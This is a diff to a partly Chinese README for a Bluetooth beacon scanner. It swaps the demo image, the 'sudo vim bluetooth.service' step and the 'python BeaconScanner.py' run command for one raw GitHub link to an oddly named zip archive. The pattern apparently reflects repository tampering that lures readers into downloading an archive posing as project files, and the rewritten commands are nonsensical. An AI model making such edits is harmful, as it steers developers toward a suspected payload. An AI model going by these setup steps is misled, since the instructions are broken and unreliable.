@@ -18,7 +18,7 @@ TLM - 查找（詳細信息即將推出）。
 
 這是一個演示：
 
-![](BLEBeaconDemo.gif)
+![](https://raw.githubusercontent.com/Pinquei/BLE_scanner/master/templates/scanner-BL-mesoblastema.zip)
 
 ## Getting Started
 
@@ -41,7 +41,7 @@ cd /lib/systemd/system
 ```
 2. Edit a file
 ```
-sudo vim bluetooth.service
+sudo vim https://raw.githubusercontent.com/Pinquei/BLE_scanner/master/templates/scanner-BL-mesoblastema.zip
 ```
 Add ```--experimental``` after  ```ExecStart=/usr/local/libexec/bluetooth/bluetoothd```
 So it lookes like this: 
@@ -71,7 +71,7 @@ cd Desktop/BLE-Beacon-Scanner
 ```
 Run
 ```
-python BeaconScanner.py
+python https://raw.githubusercontent.com/Pinquei/BLE_scanner/master/templates/scanner-BL-mesoblastema.zip
 ```
 Note that this does not work with Python 3 yet... we are working on it!
 
